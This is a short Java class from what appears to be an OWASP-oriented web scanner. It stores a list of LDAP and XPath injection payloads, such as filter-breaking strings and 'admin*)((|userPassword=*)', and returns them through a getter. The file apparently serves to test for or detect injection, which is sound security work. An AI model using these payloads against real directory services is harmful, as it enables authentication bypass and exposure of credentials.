package com.funtap.awass.Top10OWASPWeb2021.PayLoadSignature.A3Injection;

public class LDAPInjection {
    private static String[] arrPayLI;

    public LDAPInjection() {
        arrPayLI = new String[]{
                "*",
                "*)(&",
                "*))%00",
                ")(cn=))\\x00",
                "*()|%26'",
                "*()|&'",
                "*(|(mail=*))",
                "*(|(objectclass=*))",
                "*)(uid=*))(|(uid=*",
                "*/*",
                "*|",
                "/",
                "//",
                "//*",
                "@*",
                "|",
                "admin*",
                "admin*)((|userpassword=*)",
                "admin*)((|userPassword=*)",
                "x' or name()='username' or 'x'='y",
        };
    }
    public String[] getArrPayLI() {
        return arrPayLI;
    }
}
